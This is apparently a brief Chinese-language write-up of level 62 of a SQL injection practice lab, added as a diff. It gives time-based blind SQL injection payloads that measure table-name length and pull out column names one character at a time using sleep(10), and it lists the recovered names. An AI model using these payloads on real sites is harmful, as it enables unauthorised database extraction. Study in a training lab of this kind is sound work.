@@ -1,0 +1,14 @@
+第62关
+
+盲注
+
+爆出表名
+?id=1') and if(length((select group_concat(table_name) from information_schema.tables where table_schema='challenges'))=10,sleep(10),1) --+
+aujhsgse9h
+
+爆列名
+'?id=1\') and if(substr((select concat(column_name) from information_schema.columns where table_name=\'aujhsgse9h\' limit 2,1),'+str(j)+',1)=\''+i+'\',sleep(10),1) --+'
+secret_kang
+
+
+闯关成功！！！
